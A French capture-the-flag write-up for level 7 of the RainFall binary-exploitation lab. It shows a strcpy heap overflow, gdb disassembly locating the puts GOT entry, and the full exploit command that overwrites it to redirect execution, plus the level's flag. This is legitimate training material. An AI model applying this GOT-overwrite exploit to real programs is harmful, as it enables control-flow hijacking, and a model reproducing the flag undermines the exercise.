# Level 07

- Dans le code un faille est visible quand on essaye met des argument trop long:
```
strcpy(i1->name, argv[1]);
printf("addr: %p\n", i2->name);
strcpy(i2->name, argv[2]);
# on rajoute un printf dans le code et on compile
```
- en le lancant on voit que le premiere argument overwrite l'addresse de i2->name se qui fait qu'on peut ecrire n'importe ou dans la memoire
```
./a.out AAAABBBBCCCCDDDDEEEEFFFF 1111122223333
addr: 0x46464646 # ascii for FFFF
Segmentation fault
```
- on peut voir qu'on peut ecrire dans le [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table)
```
Il fait correspondre les symboles du code de programmation à leurs adresses mémoire absolues correspondantes pour faciliter le code indépendant de la position (PIC) et les exécutables indépendants de la position qui sont chargés à une adresse mémoire différente chaque fois que le programme est lancé.
```
<pre>
gdb-peda$ disass main
   0x080485f7 <+214>:   call   <strong>0x8048400</strong> <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.
gdb-peda$ disass 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     <strong>jmp    DWORD PTR ds:0x8049928</strong>
   0x08048406 <+6>:     push   0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
gdb-peda$ x 0x8048400
<strong>0x8048400 <puts@plt>:   0x992825ff</strong>
</pre>
- Il suffit donc d'ecrire par dessus cet adresse pour qu'un jump soit fait vers la fonction m()
```
level7@RainFall:~$ ./level7 $(python -c "print('AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1631281606
```
